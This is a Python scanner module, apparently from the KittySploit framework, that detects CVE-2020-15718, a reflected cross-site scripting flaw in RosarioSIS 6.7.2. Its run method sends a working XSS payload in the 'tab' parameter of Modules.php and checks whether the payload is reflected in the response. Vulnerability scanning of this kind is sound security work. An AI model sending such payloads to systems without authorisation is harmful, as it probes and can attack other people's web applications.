#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RosarioSIS version 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'RosarioSIS 6.7.2 - Cross-Site Scripting Detection',
        'description': "RosarioSIS version 6.7.2 and earlier contains a reflected cross-site scripting (XSS) vulnerability in the Preferences module. The 'tab' parameter in Modules.php is not properly sanitized, allowing an attacker to inject arbitrary JavaScript code via a crafted URL.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rosarios', 'xss', 'rosariosis', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/184944',
            'https://github.com/MarkLee131/awesome-web-pocs/blob/main/CVE-2020-15718.md',
            'https://gitlab.com/francoisjacquet/rosariosis/-/blob/mobile/CHANGES.md',
            'https://gitlab.com/francoisjacquet/rosariosis/-/commit/89ae9de732024e3a2e99262aa98b400a1aa6975a',
        ],
        'cve': 'CVE-2020-15718',
    }

    def run(self):
        path = '/Modules.php?modname=Users/Preferences.php&tab="%20onmouseover=alert(document.domain)%20x="'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        content_type = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        body_all = ('" onmouseover=alert(document.domain)', 'rosariosis',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='RosarioSIS 6.7.2 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

